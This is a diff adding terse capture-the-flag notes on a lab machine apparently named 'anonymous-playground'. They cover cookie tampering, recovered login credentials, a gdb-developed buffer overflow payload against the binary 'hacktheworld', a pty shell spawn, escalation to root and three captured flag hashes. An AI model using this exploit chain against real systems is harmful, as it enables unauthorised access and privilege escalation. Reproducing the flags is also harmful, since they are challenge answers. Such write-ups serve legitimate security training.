@@ -1,0 +1,65 @@
+Date:31/mar/2021
+Time:16:40
+
+ip 10.10.131.45
+http://10.10.131.45/zYdHuAKjP/
+got that on nmap scan
+change vlaue=granted in cookie 
+refresh the page
+
+check tmp.py
+python3 tmp.py
+MaGNa:MaGNaISaNELEPHaNT  magna magnaisanelephant
+ confirm this http://10.10.131.45/operatives.php
+└─$ sudo  ssh magna@10.10.131.45
+credentials should be in small letters not capital letters
+
+boom!!!!
+magna@anonymous-playground:~$ python -m SimpleHTTPServer 
+└─$ wget http://10.10.131.45:8000/hacktheworld 
+└─$ chmod 777 hacktheworld       
+used ghidra to check what inside hacktheworld
+
+└─$ python3 -c "print('a'*80)" > tmp
+└─$ gdb hacktheworld 
+(gdb) info function
+(gdb) disass main
+(gdb) break *0x40070f
+(gdb) run < tmp
+(gdb) x/48xw $rsp
+(gdb) quit
+Quit anyway? (y or n) y
+
+└─$ python3 -c "print('a'*72+'\x57\x06\x40\x00\x00\x00\x00\x00')" > tmp.txt
+└─$ gdb hacktheworld
+(gdb) disass main
+(gdb) break *0x40070f
+(gdb) run < temp.txt
+(gdb) x/48xw $rsp
+(gdb) continue
+(gdb) quit
+Quit anyway? (y or n) y
+
+└─$ ssh magna@10.10.131.45 
+magna@anonymous-playground:~$ python3 -c "print('a'*72+'\x58\x06\x40\x00\x00\x00\x00\x00')" > temp.txt
+magna@anonymous-playground:~$ (cat temp.txt; cat) | ./hacktheworld
+python -c "import pty;pty.spawn('/bin/bash')"
+spooky@anonymous-playground:/home/spooky$ sudo su
+
+
+
+root@anonymous-playground:/home/magna# cat flag.txt
+cat flag.txt
+User 1 Flag
+9184177ecaa83073cbbf36f1414cc029
+
+root@anonymous-playground:/home/spooky# cat flag.txt
+cat flag.txt
+user2flag
+69ee352fb139c9d0699f6f399b63d9d7
+
+
+root@anonymous-playground:~# cat flag.txt
+cat flag.txt
+Root Flag
+bc55a426e98deb673beabda50f24ce66
